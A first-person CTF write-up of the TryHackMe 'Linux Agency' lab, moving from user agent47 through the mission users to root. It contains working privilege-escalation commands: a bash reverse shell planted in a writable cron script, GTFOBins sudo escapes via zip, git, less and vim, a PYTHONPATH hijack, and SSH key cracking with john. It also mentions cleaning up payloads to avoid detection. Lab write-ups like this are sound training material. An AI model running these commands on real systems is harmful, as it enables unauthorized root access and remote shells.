# THM-Writeup-LinuxAgency
Writeup for TryHackMe Linux Agency Lab - using find, grep, sudo, ssh, cron, GTFOBins (zip, git, less, vim), python, and TTY stabilization (script, stty, export TERM) for user enumeration and privilege escalation.

By Ramyar Daneshgar 


In this lab, I was tasked with completing a series of Linux fundamentals and privilege escalation exercises across multiple users, beginning with `agent47` and ending in root access. The format required me to log in via SSH, retrieve each user’s flag, and use that flag as the password to escalate to the next user account.

---

## Task 1: Initial Access as `agent47`

I began by SSH’ing into the target machine:

```bash
ssh agent47@10.10.188.218
# Password: 640509040147
```

Upon logging in, the system displayed that I must retrieve the flag for the next user (`mission1`). That flag would serve as the password for switching to the next user.

---

## Task 2: Locating User Flags

I followed the format consistently for each mission user. To locate the flag, I used combinations of:

- `find / -type f -name "flag.txt" 2>/dev/null`
- `grep -r "missionX" / 2>/dev/null`
- Searching hidden files: `grep -r missionX * .[^.]* 2>/dev/null`

### Example: `agent47` → `mission1`

```bash
grep -r mission1 * .[^.]* 2>/dev/null
```

This revealed:

```bash
mission1{17********************f0}
```

I then switched users:

```bash
su mission1
# Password: mission1{17********************f0}
```

I repeated this process through all `missionX` users (mission1 → mission30). Some flags were embedded in files (`flag.txt`), some hidden in binaries (ELF), and others encoded (base64, hex, binary).

---

## Selected Examples of Techniques Used

### mission16 (Hex to ASCII)

I found a hex string and used:

```bash
echo <hex> | xxd -r -p
```

To decode it into plain text.

---

### mission17 (ELF Binary)

When I saw the `ELF` header, I used `strings` and `chmod +x` with `./binary` to execute and analyze the binary:

```bash
strings mission17.elf
./mission17.elf
```

---

### mission20 (XOR Obfuscation)

The flag was obfuscated with XOR using `S`. I copied the encoded string to my machine and decoded it with Python:

```python
flag = ">:  :<=ab(d76dfe2210fak1gge5e61`kgbj`bk5c0."
for i in range(len(flag)):
    flag = (flag[:i] + chr(ord(flag[i]) ^ ord("S")) +flag[i + 1:])
    print(flag[i], end = "")
```

---

### mission21 (TTY Shell)

I needed a proper TTY shell to improve interaction:

```bash
script -qc /bin/bash /dev/null
```

This gave me a pseudo-interactive shell. I also ran:

```bash
export TERM=xterm
```

And then:

```bash
Ctrl + Z
stty raw -echo; fg
```

To enable full terminal features like tab-completion and arrow keys.

---

## Task 4: Privilege Escalation

After `mission30`, I began escalating privileges using various techniques. Below are key privilege escalation stages.

---

### dalia – Cronjob Backdoor

I checked `/etc/crontab` and saw a script (`47.sh`) running every minute. It was owned by me and world-writable.

I replaced its contents with a reverse shell:

```bash
echo 'bash -i >& /dev/tcp/10.2.12.26/4444 0>&1' > /path/to/47.sh
nc -lvnp 4444
```

Within 30 seconds, I had a reverse shell as `dalia`.

---

### silvio – GTFOBins (zip + sudo)

```bash
TF=$(mktemp -u)
sudo -u silvio zip $TF /etc/hosts -T -TT 'sh #'
```

This leveraged the `-TT` flag in zip to spawn a shell as `silvio`.

---

### reza – GTFObins (git + PAGER)

```bash
sudo -u reza PAGER='sh -c "exec sh 0<&1"' git -p
```

I followed up with:

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

---

### jordan – Python PATH Hijack

The script `/opt/scripts/Gun-Shop.py` tried importing a nonexistent `shop` module. I created a fake module:

```bash
mkdir -p /tmp/shop
echo 'import os; os.system("/bin/bash")' > /tmp/shop/__init__.py
sudo -u jordan PYTHONPATH=/tmp /opt/scripts/Gun-Shop.py
```

---

### ken – GTFOBins (less)

```bash
sudo -u ken less /etc/profile
```

Inside `less`, I typed `!/bin/sh` to break out.

---

### sean – GTFOBins (vim)

```bash
sudo -u sean vim -c ':!/bin/sh'
```

To improve the shell, I ran:

```bash
script -qc /bin/bash /dev/null
```

---

### maya – GTFOBins (base64)

I encoded a reverse shell script using base64 and used the GTFOBins sudo privilege to decode and execute it.

---

### robert – SSH Private Key Cracking

I found a `.ssh` folder with `id_rsa`. I copied it:

```bash
scp agent47@10.10.188.218:/home/robert/.ssh/id_rsa .
```

Then ran:

```bash
ssh2john id_rsa > hash.txt
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

---

### Final Stage – Root Access

I noticed an SSH service on port 2222 using:

```bash
ss -tulpn
```

I attempted to SSH to this port with cracked credentials.

Then, using:

```bash
sudo -l
```

I found a bash binary allowed with sudo.

Using:

```bash
sudo bash
```

I was root.

---

### root.txt

I ran:

```bash
cat /root/root.txt
```

Challenge complete.

---

## Lessons Learned

1. **Enumeration Is Everything**: Each stage required careful use of `find`, `grep`, `strings`, and `sudo -l`. Deep system inspection is vital.
2. **Shell Interaction Matters**: A better TTY shell significantly improves workflow, especially in CTF environments. I will always stabilize my shells early.
3. **GTFOBins Is a Critical Tool**: Knowing how to exploit standard binaries with sudo access (zip, less, git, base64, etc.) proved essential.
4. **Crontab and PATH Hijacking Are Practical Vectors**: Watching for writable scripts and importable Python modules led to multiple privilege escalations.
5. **Binary Analysis Shouldn’t Be Overlooked**: Recognizing ELF and Java binaries and decoding XOR, base64, or hex strings were common throughout.
6. **Post-Exploit Hygiene Is Key**: I frequently cleaned up my dropped payloads and temporary files to avoid detection in a real-world scenario.
7. **Password Reuse Patterns Emerge**: Most passwords followed a flag format (`username{md5}`), which helped anticipate the next steps and brute-force attempts if necessary.
8. **Timing Matters in Cron-Based Escalation**: I had a narrow window (30 seconds) to inject a reverse shell into a script. Timing precision is crucial in real-world cronjob exploits.
